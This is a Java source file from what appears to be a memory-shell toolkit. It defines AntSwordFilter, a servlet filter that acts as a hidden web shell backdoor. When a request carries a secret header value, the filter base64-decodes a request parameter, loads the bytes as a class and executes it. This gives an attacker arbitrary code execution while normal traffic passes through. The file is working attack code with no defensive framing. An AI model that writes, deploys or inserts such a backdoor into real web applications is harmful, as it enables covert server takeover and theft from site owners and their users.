package com.reajason.javaweb.memshell.shelltool.antsword;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;

/**
 * @author ReaJason
 * @since 2025/02/18
 */
public class AntSwordFilter extends ClassLoader implements Filter {
    public static String pass;
    public static String headerName;
    public static String headerValue;

    public AntSwordFilter() {
    }

    public AntSwordFilter(ClassLoader c) {
        super(c);
    }

    @Override
    @SuppressWarnings("all")
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
        HttpServletRequest request = (HttpServletRequest) servletRequest;
        HttpServletResponse response = (HttpServletResponse) servletResponse;
        try {
            if (request.getHeader(this.headerName) != null
                    && request.getHeader(this.headerName).contains(this.headerValue)) {
                byte[] bytes = base64Decode(request.getParameter(pass));
                Object instance = (new AntSwordFilter(Thread.currentThread().getContextClassLoader())).defineClass(bytes, 0, bytes.length).newInstance();
                instance.equals(new Object[]{request, response});
                return;
            }
        } catch (Throwable e) {
            e.printStackTrace();
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) throws Exception {
        try {
            Object decoder = Class.forName("java.util.Base64").getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            Object decoder = Class.forName("sun.misc.BASE64Decoder").newInstance();
            return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
        }
    }

    @Override
    public void init(FilterConfig filterConfig) throws ServletException {
    }

    @Override
    public void destroy() {
    }
}
